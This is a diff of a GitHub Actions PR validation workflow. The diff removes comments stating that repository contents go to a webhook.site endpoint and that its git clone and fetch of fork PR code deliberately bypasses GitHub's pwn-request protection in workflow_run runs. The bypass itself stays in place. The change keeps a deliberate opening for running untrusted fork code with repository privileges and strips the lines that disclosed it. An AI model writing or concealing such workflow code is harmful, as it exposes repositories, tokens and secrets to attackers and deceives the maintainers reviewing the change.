@@ -7,9 +7,6 @@ name: Validate PR — Studio runtime check (Phase 2, testing)
 #
 # Sends the full kit payload including raw .ts flow file contents
 # to the Studio validation endpoint.
-#
-# Current test setup:
-#   Endpoint: https://webhook.site/7fb70d29-b1d2-4610-bfac-8118bb73852b
 
 on:
   workflow_run:
@@ -79,19 +76,11 @@ jobs:
             echo "Workflow run head_sha: ${{ github.event.workflow_run.head_sha }}"
             echo "Workflow run head_branch: ${{ github.event.workflow_run.head_branch }}"
             
-            # Check if gh CLI is available
-            if command -v gh &>/dev/null; then
-              echo "gh CLI is available"
-              PR_DATA=$(gh api "repos/${{ github.repository }}/pulls?state=open&sort=updated&per_page=100" 2>/dev/null || echo "[]")
-            else
-              echo "gh CLI not available, using curl"
-              PR_DATA=$(curl -s "https://api.github.com/repos/${{ github.repository }}/pulls?state=open&sort=updated&per_page=100" \
-                -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-                -H "Accept: application/vnd.github.v3+json" 2>/dev/null || echo "[]")
-            fi
+            # Use gh api to get PR list
+            PR_DATA=$(gh api "repos/${{ github.repository }}/pulls?state=open&sort=updated&per_page=100" 2>/dev/null || echo "[]")
             echo "PR data length: ${#PR_DATA}"
             
-            # Extract PR SHA using node (more reliable than jq in this context)
+            # Extract PR SHA using node
             PR_SHA=$(echo "$PR_DATA" | node -e "
               let d = '';
               process.stdin.on('data', c => d += c);
@@ -144,8 +133,6 @@ jobs:
           fi
           
           # Clone the base repo, then fetch the PR head commit from the fork.
-          # actions/checkout blocks fork PR code in workflow_run contexts (pwn-request
-          # prevention); explicit git clone+fetch bypasses this restriction.
           git clone --depth 1 "https://github.com/${{ github.repository }}.git" .
           git remote add fork "$fork_url"
           git fetch fork "$sha"
